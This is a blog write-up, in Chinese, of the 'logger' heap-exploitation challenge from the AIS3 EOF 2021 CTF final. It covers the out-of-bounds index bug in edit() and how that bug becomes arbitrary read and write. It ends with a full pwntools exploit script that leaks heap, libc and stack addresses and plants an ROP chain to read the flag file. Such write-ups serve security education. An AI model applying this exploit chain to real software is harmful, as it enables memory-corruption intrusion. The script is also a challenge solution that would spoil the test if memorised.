---
title: AIS3 EOF 2021 final - logger
date: 2022-02-18 15:16:58
tags:
- AIS3 EOF 2021 final
- pwn
- heap
categories:
- CTF
---
# logger
[題目來源](https://github.com/u1f383/My-CTF-Challenges)
![](https://i.imgur.com/9pV0RjK.png)

## source code
此題提供比賽期間有提供 source code ，為一題選單題。
以下為 `main` 的內容
```c
int main()
{
    init_proc();

    unsigned long len;
    printf("len: ");
    len = getu64();
    len = len > 0x28 ? 0x28 : len;

    printf("name: ");
    me = malloc(len);
    fgets(me, len, stdin);

    while (1) {
        printf(
            "1. new\n"
            "2. delete\n"
            "3. show\n"
            "4. edit\n"
            "5. bye\n"
            "> "
        );
        switch (getu64()) {
        case 1: new(); break;
        case 2: delete(); break;
        case 3: show(); break;
        case 4: edit(); break;
        case 5: goto bye;
        default: break; }
    }

bye:
    return 0;
}
```
在 `main` 的一開始，會先執行 `init_proc` ，其中要特別注意的是，此題使用 **seccomp** 禁止了 `execve` system call。這裡值得注意的是，seccomp 的初始化會使用到 heap , 而這題正是利用 `seccomp_release` 釋放的 heap 記憶體。
```c
void init_proc()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);
    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW);
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
    seccomp_load(ctx);
    seccomp_release(ctx);
}
```
此函數為**漏洞**發生的地方，使用 `idx` 時並沒有檢查邊界，導致 `idx` 可以為任意的值，使得這個函數有一個限制的任意寫。
```c
void edit()
{
    unsigned long idx;
    printf("idx: ");
    idx = getu64();
    printf("msg: ");
    fgets(logs[idx]->msg, logs[idx]->len, stdin);
}
```
## 利用分析
### 利用變數 me 控制 logs 的內容
在執行到下面這段 code 的之前，heap bins 的 layout 大概如下圖
```c
    ...
        
    me = malloc(len);
    fgets(me, len, stdin);

    ...
```
![](https://i.imgur.com/DXYGxdr.png)
當我們將 `len` 設為 1 時，`me` 將會如下圖
`me` 當前所指向的地址為 `0x00005555555598f0`，而 `0x00005555555598f0 + 0x10` 剛好為 `0x0000555555559900`。
![](https://i.imgur.com/KG73UsQ.png)

且 `me` 的地址等價於 `&logs[7]`，如此一來我們便可以利用 `edit` 且 `idx` 設為 7，對 `((Log)me)->msg)` ( 也就是 `0x0000555555559a00` ) 的內容進行改寫，但是只能寫入一個 `\x00` 。
![](https://i.imgur.com/aEQYQ8Z.png)

### 從寫入 1 byte `\x00` 到任意長度任意內容

有了前面的想法，我們可以嘗試獲得一個位於 `0x0000555555559a00` 的 `Log` 結構，且此結構中 `msg` 指向的地址為 `0x00005555555599XX`，再搭配上 `edit` 且 `idx` 設為 7，我們便可以控制 `((Log)me)->len)` 為任意長度。 ( 我們將此 `LOG` 存在 `logs[0]` )
要達到這樣的目標，我們只需要執行下面幾個步驟。
1. new 一個大小為 0 的 LOG 放到 log\[0\]
2. show logs\[0\] ( **leak heap address** )
3. new 一個大小為 96 的 LOG 放到 log\[1\]
4. new 一個大小為 96 的 LOG 放到 log\[2\]
5. delete log\[0\]
6. new 一個大小為 96 的 LOG 放到 log\[0\]

執行完以上步驟，此時的 `logs[0]` 所指向的內容如下圖
![](https://i.imgur.com/aplCyuz.png)

6. edit 且 idx 設為 7 

到了這步，我們已經可以控制 `0x0000555555559900` 的內容了，如此一來便能夠實現寫入任意長度任意內容。
![](https://i.imgur.com/wvZlhft.png)

7. edit 且 idx 設為 0 寫入內容為 AAAAAAAA

![](https://i.imgur.com/zsuXfBH.png)

### 製作出 read/write primitives
以下為 pseudo code
read primitives
```python
# 第一個參數為 idx，後面為寫入的內容，addr 為目標地址
my_edit(7, p64(addr) + p64(0) + b"a" * 7)
my_show(0)
```
write primitives
```python
# 第一個參數為 idx，後面為寫入的內容，addr 為目標地址
my_edit(7, p64(addr) + p64(0) + b"a" * 7)
my_edit(0, data)
```
有了 read/write primitives 剩下就是一些常規的 pwn 操作了，就不多做贅述了。

## exploit
```python
import re
from pwn import *
import binascii
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

heap_base = 0
libc_base = 0
stack_addr = 0

local = 0
if local:
    p = process("./logger")
else:
    p = remote('localhost', 45125)

def init(l, n):
    p.sendlineafter(b"len: ", l)
    p.sendafter(b"name: ", n)


def my_new(idx, l, msg):
    p.sendlineafter(b"> ", b'1')
    p.sendlineafter(b"idx: ", idx)
    p.sendlineafter(b"len: ", l)
    if msg:
        p.sendlineafter(b"msg: ", msg)

def my_edit(idx, msg):
    p.sendlineafter(b"> ", b'4')
    p.sendlineafter(b"idx: ", idx)
    if msg:
        p.sendlineafter(b"msg: ", msg)


def my_show(idx):
    p.sendlineafter(b"> ", b'3')
    p.sendlineafter(b"idx: ", idx)
    return p.recvuntil(b"1. new\n")

def my_delete(idx):
    p.sendlineafter(b"> ", b'2')
    p.sendlineafter(b"idx: ", idx)

def my_bye():
    p.sendlineafter(b"> ", b'5')

def leak_heap_addr():
    global heap_base
    init(b"1", b"")

    my_new(b"0", b"0", b"")
    tmp = my_show(b"0")
    
    # leak heap base
    idx = tmp.index(b"msg: ") + 5
    heap_base = u64(tmp[idx: idx+6].ljust(8, b"\x00")) - 3632
    print("heap_base: ", hex(heap_base))

def init_primitives():
    my_new(b"1", str(0x60).encode(), b"1")
    my_new(b"2", str(0x60).encode(), b"1")

    my_delete(b"0")
    my_new(b"0", str(0x60).encode(), b"1")
    my_edit(b"7", b"")
    my_edit(b"0", b"A" * 0x7)

def write_primitives(addr, data):
    print(f"write {binascii.hexlify(data).decode()} to {hex(addr)}")
    my_edit(b"7", p64(addr) + p64(0) + b"a" * 7)
    my_edit(b"0", data)

def read_primitives(addr):
    print(f"read from {hex(addr)}")
    my_edit(b"7", p64(addr) + p64(0) + b"a" * 7)
    return my_show(b"0")

def leak_libc_addr():
    global libc_base
    my_new(b"3", b"80", b"1")
    # &logs[3]->msg == heap_base + 672
    print(f"leak libc address from {hex(heap_base + 672)}")
    target = heap_base + 672 - 8
    write_primitives(target, p64(1072+1))

    # to avoid unlink in free, we have to contruct two fake chunks after &logs[3]->msg
    write_primitives(target - 8 + 1072 + 8, p64(0x20+1))
    write_primitives(target - 8 + 1072 + 8 + 0x20, p64(0x20+1))
    
    my_delete(b"3")

    # leak libc base
    tmp = read_primitives(target + 8)
    idx = tmp.index(b"msg: ") + 5
    libc_base = u64(tmp[idx: idx+6].ljust(8, b"\x00")) - 2014176
    print("libc base: ",hex(libc_base))

# https://github.com/Naetw/CTF-pwn-tips#leak-stack-address
def leak_stack():
    global stack_addr
    environ = libc_base + 2028256
    print("environ: ", hex(environ))
    
    tmp = read_primitives(environ)
    idx = tmp.index(b"msg: ") + 5
    stack_addr = u64(tmp[idx: idx+6].ljust(8, b"\x00")) 
    print("stack_addr: ",hex(stack_addr))
   

def set_rop():
    main_ret_addr = stack_addr - 256

    rop_gadgets = b"".join(map(lambda x:p64(x), [
        libc_base + 0x26b72, # pop rdi ; ret 
        libc_base + 2011136, # "./flag"
        libc_base + 0x27529, # pop rsi ; ret 
        0,
        libc_base + 1117776, # open

        libc_base + 0x26b72, # pop rdi ; ret 
        3,                   # fd of ./flag
        libc_base + 0x27529, # pop rsi ; ret 
        libc_base + 2011136, # buf
        libc_base + 0x162866,  # pop rdx ; pop rbx ; ret
        0x123,
        0x123,
        libc_base + 1118512, # read

        libc_base + 0x26b72, # pop rdi ; ret 
        1,                   # FD_STDOUT
        libc_base + 0x27529, # pop rsi ; ret 
        libc_base + 2011136, # buf
        libc_base + 0x162866,  # pop rdx ; pop rbx ; ret
        0x123,
        0x123,
        libc_base + 1118672, # write
    ]))
    print("main frame's return address: ",hex(main_ret_addr))
    print("buffer: ", hex(libc_base + 2011136))
    write_primitives(main_ret_addr, rop_gadgets)
    if not local:
        write_primitives(libc_base + 2011136, b"/home/logger/flag\x00")
    else:
        write_primitives(libc_base + 2011136, b"./flag\x00")



def run_rop():
    my_bye()

leak_heap_addr()
init_primitives()
leak_libc_addr()
leak_stack()
set_rop()
run_rop()
print(re.search(b"FLAG{.*}", p.recvall()).group(0).decode())
if local:
    gdb.attach(p)

p.interactive()
```
